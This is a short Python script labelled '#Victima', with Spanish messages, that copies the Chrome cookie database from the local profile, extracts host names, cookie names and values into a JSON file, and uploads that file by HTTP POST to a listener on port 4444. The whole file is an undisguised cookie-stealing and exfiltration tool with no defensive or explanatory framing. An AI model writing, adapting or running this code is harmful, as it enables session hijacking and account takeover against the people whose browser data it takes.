#Victima

import os
import sqlite3
import json
import requests
import shutil

def get_chrome_profile_path():
    profile_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Network')
    if os.path.exists(profile_path):
        return profile_path
    return None

def extract_chrome_cookies():
    profile_path = get_chrome_profile_path()
    if not profile_path:
        print("No se pudo encontrar el perfil de Chrome.")
        return []

    cookies_db_path = os.path.join(profile_path, 'cookies')
    shutil.copy2(cookies_db_path, 'cookies_temp.sqlite')
    conn = sqlite3.connect('cookies_temp.sqlite')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, value FROM cookies')
    cookies = [{'host': row[0], 'name': row[1], 'value': row[2]} for row in cursor.fetchall()]
    conn.close()
    os.remove('cookies_temp.sqlite')
    return cookies

def save_cookies_to_json(cookies, filename='cookies.json'):
    with open(filename, 'w') as file:
        json.dump(cookies, file, indent=4)

def send_cookies_file(filename, ip='0.0.0.0', port=4444):
    url = f'http://{ip}:{port}/upload'
    files = {'file': open(filename, 'rb')}
    try:
        response = requests.post(url, files=files)
        print(f'Status de envío: {response.status_code}')
    except Exception as e:
        print(f'Error al enviar archivo de cookies: {e}')

if __name__ == "__main__":
    cookies = extract_chrome_cookies()
    save_cookies_to_json(cookies)
    send_cookies_file('cookies.json')
